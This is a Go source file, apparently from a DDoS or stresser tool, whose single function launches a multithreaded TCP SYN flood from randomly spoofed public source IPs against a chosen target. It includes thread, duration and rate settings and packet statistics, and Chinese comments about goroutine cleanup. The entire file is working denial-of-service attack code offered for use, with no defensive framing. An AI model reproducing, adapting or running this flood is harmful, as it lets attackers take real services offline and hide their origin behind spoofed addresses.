package attack

import (
	"sync"
	"sync/atomic"
	"time"
)

func StartSpoofedTCPFloodEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, cfg.Targets, "tcp_syn_spoof", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))

	ip, port := SplitTarget(cfg.Target)
	if port == 0 {
		port = 80
	}

	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	if !cfg.CanSpoofIP {
		// abort 同时关闭 StopChan（让 trackRates 退出）与 DoneChan：
		// 只关 DoneChan 会永久泄漏每秒 ticker 的 goroutine
		s.abort()
		return s
	}

	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int64) {
				defer wg.Done()
				rng := NewFastRNG(time.Now().UnixNano() + seed)
				endTime := time.Now().Add(dur)

				conn, connErr := NewSpoofConn(ip, port)
				if connErr == nil {
					defer conn.Close()
				}

				tc := newTimeCache()
				for tc.since(endTime) < 0 {
					select {
					case <-s.StopChan:
						return
					default:
					}

					if !s.checkRate(40) {
						time.Sleep(time.Microsecond * 100)
						continue
					}

					srcIP := rng.RandomPublicIP()
					srcPort := rng.RandomPort()

					var err error
					if conn != nil {
						err = conn.SendSYNRaw(srcIP, ip, port, srcPort)
					} else {
						err = SendSpoofedSYNRaw(srcIP, ip, port, srcPort)
					}
					if err != nil {
						atomic.AddUint64(&s.Stats.Errors, 1)
					} else {
						atomic.AddUint64(&s.Stats.PacketsSent, 1)
						atomic.AddUint64(&s.Stats.BytesSent, 40)
					}
					tc.refresh()
				}
			}(int64(i))
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		// 与其他攻击方法一致：带 5s 上限等待，个别 goroutine 卡死时
		// 不能让 DoneChan 永不关闭（否则任务 ID 永久报废、无法重启）
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}
